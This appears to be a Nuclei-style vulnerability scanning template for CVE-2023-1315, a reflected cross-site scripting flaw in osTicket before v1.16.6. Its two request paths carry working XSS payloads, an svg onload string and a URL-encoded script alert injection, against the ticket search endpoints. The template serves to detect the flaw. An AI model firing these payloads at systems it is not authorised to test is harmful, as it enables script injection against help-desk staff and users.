id: CVE-2023-1315

info:
  name: osTicket < v1.16.6- Cross-site Scripting (XSS) - Reflected 
  author: ctflearner
  severity: medium
  description: |
    Cross-site Scripting (XSS) - Reflected in GitHub repository osticket/osticket prior to v1.16.6.

  reference:
    - https://huntr.com/bounties/70a7fd8c-7e6f-4a43-9f8c-163b8967b16e
    - https://nvd.nist.gov/vuln/detail/CVE-2023-1315
    
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cve-id: CVE-2023-1315
    cwe-id: CWE-79

  metadata:
    verified: true
    max-request: 2
    product: osTicket
  tags: cve2023,cve,huntr,osTicket,reflectedxss,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}/osTicket/scp/ajax.php/tickets/search?parent_id=1"><svg/x=">"/onload=confirm()//"
      - "{{BaseURL}}/osTicket/scp/ajax.php/tickets/search/create?pid=adhoc%2cpdXBTnfSg0riebm%22%3e%3cscript%3ealert(1)%3c%2fscript%3etgghb"

    matchers:
      - type: word
        part: body
        words:
          - "alert(1)"
